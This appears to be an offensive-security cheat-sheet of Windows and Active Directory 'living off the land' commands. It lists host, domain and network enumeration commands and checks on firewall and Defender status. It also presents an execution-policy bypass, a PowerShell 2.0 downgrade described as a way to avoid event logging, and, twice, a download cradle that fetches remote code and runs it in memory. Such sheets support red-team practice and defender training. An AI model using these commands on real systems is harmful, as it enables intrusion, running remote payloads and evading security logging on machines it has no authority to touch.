# AD & Windows native tools
>Living off the land #livingofftheland #lotl
#### Basic enumeration commands 
###### Get PC name 
```
hostname
```
###### System information 
```
Systeminfo
```
```
cmd /c ver
```
```
cmd /c winver
```
```
wmic os get Caption,Version,OSArchitecture
```
###### Get OS version information 
```
[System.Environment]::OSVersion.Version
```
###### Print patches and hotfixes 
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
###### Host information including attributes:
```
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```
###### List all process
```
wmic process list /format:list
```
###### Information about the domain and DC
```
wmic ntdomain list /format:list
```
###### Print network adapters 
```
ifconfig /all
```
###### Display a list of environment variable 
```
cmd /c set
```
###### Print domain name 
```
echo %USERDOMAIN%
```
###### Print domain controller name 
```
echo %logonserver%
```
---
#### PowerShell (quick check) 
```
Get-Module
```
```
Get-ExecutionPolicy -List
```
```
whoami
```
```
Get-ChildItem Env: | ft key,value
```

There are many version of PowerShell exists on system and PowerShell event logging introduced with `powershell 3.0` and forward. If we can spawn `powershell 2.0` or older, our actions will not be logged in event viewer.

# Downgrade PowerShell (event log bypass technique)
#### List loaded modules
```
Get-Module
```
#### Get execution policy
```
Get-ExecutionPolicy -List
```
#### Execution policy bypass
>It bypass execution policy for current process (powershell)
```
Set-ExecutionPolicy Bypass -Scope Process
```
#### View environment variable
```
Get-ChildItem Env: | ft Key,Value
```
#### Check powershell history
```
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
#### Download a file and load in memory
```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```


#### Print current version 
```
Get-host
```
#### Downgrade PowerShell
```
powershell.exe -version 2
```

#### Checking defenses
###### Firewall check 
```
netsh advfirewall show allprofiles
```
###### Windows defender check 
```
sc query windefend
```
###### Check anti-malware software is installed on the system 
```
Get-MpComputerStatus
```
###### Logged on users check 
```
qwinsta
```

#### Network enumeration
###### ARP table 
```
arp -a
```
###### Routing table 
```
route print
```
###### Display the status of firewall  
```
netsh advfirewall show state
```
###### Run a file in memory
```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```

###### net command workaround
```
net1 user
```

